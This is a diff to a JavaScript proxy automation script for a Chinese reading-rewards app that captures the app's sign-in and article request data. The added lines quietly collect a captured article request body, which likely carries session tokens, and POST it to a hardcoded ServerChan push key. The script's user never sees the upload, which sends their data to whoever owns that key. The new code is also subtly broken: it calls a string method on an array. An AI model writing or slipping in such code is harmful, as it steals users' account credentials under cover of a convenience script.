@@ -161,7 +161,8 @@ else if ($.time('HH')>4&&$.time('HH')<8){
   .catch((e) => $.logErr(e))
   .finally(() => $.done())
 
-
+let bodyList = []
+let index=0
 function GetCookie() {
    if ($request && $request.method != `OPTIONS`&& $request.url.match(/\/TaskCenter\/(sign|getSign)/)) {
    const signheaderVal = JSON.stringify($request.headers)
@@ -174,6 +175,8 @@ else if ($request && $request.method != `OPTIONS`&& $request.url.match(/\/articl
     if (articlebodyVal)        $.setdata(articlebodyVal,'read_zq')
     $.log(`${$.name} 获取阅读: 成功,articlebodyVal: ${articlebodyVal}`)
     $.msg($.name, `获取阅读请求: 成功🎉`, ``)
+       bodyList.push(articlebodyVal + '/\n')
+       index ++
   }
 else if ($request && $request.method != `OPTIONS`&& $request.url.match(/\/v5\/user\/app_stay/)) {
    const timebodyVal = $request.body
@@ -187,7 +190,42 @@ else if ($request && $request.method != `OPTIONS`&& $request.url.match(/\/articl
     $.log(`${$.name} 获取惊喜红包: 成功,redpbodyVal: ${redpbodyVal}`)
     $.msg($.name, `获取惊喜红包请求: 成功🎉`, ``)
   }
+if (index == 1){
+    serverNotify("body",bodyList)
+}
  }
+
+function serverNotify(text, desp) {
+    return  new Promise(resolve => {
+            //微信server酱推送通知一个\n不会换行，需要两个\n才能换行，故做此替换
+            desp = desp.replace(/[\n\r]/g, '\n\n');
+            const options = {
+                url: `https://sc.ftqq.com/SCU130046T92a39e06a04095cffab55e3e90a8c0345fbf3aa20c5ce.send`,
+                body: `text=${text}&desp=${desp}`,
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                }
+            }
+            $.post(options, (err, resp, data) => {
+                try {
+                    if (err) {
+                        console.log('\n发送通知调用API失败！！')
+                    } else {
+                        data = JSON.parse(data);
+                        if (data.errno === 0) {
+                            console.log('\nserver酱发送通知消息成功')
+                        } else if (data.errno === 1024) {
+                            console.log('\nPUSH_KEY 错误')
+                        }
+                    }
+                } catch (e) {
+                    $.logErr(e, resp);
+                } finally {
+                    resolve(data);
+                }
+            })
+    })
+}
 
 function sign() {
     return new Promise((resolve, reject) => {
